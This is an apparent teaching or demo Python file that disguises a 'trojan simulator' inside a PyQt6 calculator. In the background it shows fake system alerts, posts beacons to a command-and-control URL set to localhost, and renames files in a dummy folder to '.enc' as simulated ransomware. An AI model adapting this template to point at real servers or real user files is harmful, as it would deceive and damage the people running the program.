import sys
import os
import random
import time
import threading
import requests
from PyQt6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QLineEdit, QGridLayout, QPushButton, QMessageBox
)
from PyQt6.QtCore import QThread, pyqtSignal, Qt

# ----------- Trojan Simulation Thread -----------

class TrojanSimulator(QThread):
    popup_signal = pyqtSignal(str)  # Signal to show popup with message

    def __init__(self, c2_url, dummy_folder, popup_interval=(90, 240)):
        super().__init__()
        self.c2_url = c2_url
        self.dummy_folder = dummy_folder
        self.popup_interval = popup_interval  # seconds (min, max)
        self.running = True
        self.popup_count = 0
        self.backdoor_installed = False
        self.ransomware_active = False

    def run(self):
        self.simulate_backdoor_install()
        while self.running:
            sleep_time = random.randint(*self.popup_interval)
            time.sleep(sleep_time)
            self.popup_count += 1

            # Show random fake alert popup
            msg = random.choice([
                "System Error: Application not responding.",
                "Warning: Suspicious activity detected.",
                "Update failed. Please restart your computer.",
                "Security Alert: Unauthorized login attempt.",
                "Disk read error detected.",
                "Network connection lost.",
                "Application crashed unexpectedly."
            ])
            self.popup_signal.emit(msg)

            # Every 2nd popup triggers beacon
            if self.popup_count % 2 == 0:
                self.send_beacon()

            # After 10 popups simulate ransomware file renaming once
            if self.popup_count == 10 and not self.ransomware_active:
                self.simulate_ransomware()
                self.ransomware_active = True

    def simulate_backdoor_install(self):
        # Simulate delay for backdoor installation
        time.sleep(5)
        self.backdoor_installed = True
        print("[Trojan] Backdoor installed.")

    def send_beacon(self):
        try:
            requests.post(self.c2_url + "/beacon", json={"status": "alive"})
            print(f"[Trojan] Beacon sent to {self.c2_url}")
        except Exception as e:
            print(f"[Trojan] Beacon failed: {e}")

    def simulate_ransomware(self):
        print("[Trojan] Simulating ransomware: renaming dummy files...")
        for filename in os.listdir(self.dummy_folder):
            file_path = os.path.join(self.dummy_folder, filename)
            if os.path.isfile(file_path) and not filename.endswith(".enc"):
                new_name = file_path + ".enc"
                try:
                    os.rename(file_path, new_name)
                    print(f"[Trojan] Renamed {filename} -> {os.path.basename(new_name)}")
                except Exception as e:
                    print(f"[Trojan] Failed to rename {filename}: {e}")

    def stop(self):
        self.running = False
        self.wait()

# ----------- Calculator GUI -----------

class Calculator(QWidget):
    def __init__(self, c2_url, dummy_folder):
        super().__init__()
        self.setWindowTitle("Calculator")
        self.setFixedSize(300, 400)

        self.layout = QVBoxLayout()
        self.display = QLineEdit()
        self.display.setAlignment(Qt.AlignmentFlag.AlignRight)
        self.display.setReadOnly(True)
        self.display.setFixedHeight(50)
        self.layout.addWidget(self.display)

        self.buttons = {}
        self.create_buttons()
        self.setLayout(self.layout)

        # Trojan simulator thread
        self.trojan = TrojanSimulator(c2_url, dummy_folder)
        self.trojan.popup_signal.connect(self.show_fake_alert)
        self.trojan.start()

    def create_buttons(self):
        grid = QGridLayout()
        buttons = {
            '7': (0, 0), '8': (0, 1), '9': (0, 2), '/': (0, 3),
            '4': (1, 0), '5': (1, 1), '6': (1, 2), '*': (1, 3),
            '1': (2, 0), '2': (2, 1), '3': (2, 2), '-': (2, 3),
            '0': (3, 0), '.': (3, 1), 'C': (3, 2), '+': (3, 3),
            '=': (4, 0, 1, 4),
        }
        for btn_text, pos in buttons.items():
            button = QPushButton(btn_text)
            button.setFixedSize(60, 40)
            if len(pos) == 2:
                grid.addWidget(button, pos[0], pos[1])
            else:
                grid.addWidget(button, pos[0], pos[1], pos[2], pos[3])
            button.clicked.connect(self.on_button_click)
            self.buttons[btn_text] = button
        self.layout.addLayout(grid)

    def on_button_click(self):
        sender = self.sender()
        text = sender.text()

        if text == 'C':
            self.display.clear()
            return
        if text == '=':
            try:
                result = str(eval(self.display.text()))
                self.display.setText(result)
            except Exception:
                self.display.setText("Error")
            return
        self.display.setText(self.display.text() + text)

    def show_fake_alert(self, message):
        alert = QMessageBox()
        alert.setWindowTitle("System Alert")
        alert.setText(message)
        alert.setIcon(QMessageBox.Icon.Warning)
        alert.setStandardButtons(QMessageBox.StandardButton.Ok)
        alert.exec()

    def closeEvent(self, event):
        self.trojan.stop()
        event.accept()

# ----------- Main -----------

if __name__ == "__main__":
    # Setup dummy folder for ransomware simulation
    dummy_folder = "dummy_files"
    os.makedirs(dummy_folder, exist_ok=True)
    # Create some dummy files if not exist
    for i in range(5):
        dummy_path = os.path.join(dummy_folder, f"file{i}.txt")
        if not os.path.exists(dummy_path):
            with open(dummy_path, "w") as f:
                f.write("This is a dummy file.\n")

    c2_url = "http://127.0.0.1:5000"  # Change to your mock C2 server URL

    app = QApplication(sys.argv)
    calculator = Calculator(c2_url, dummy_folder)
    calculator.show()
    sys.exit(app.exec())
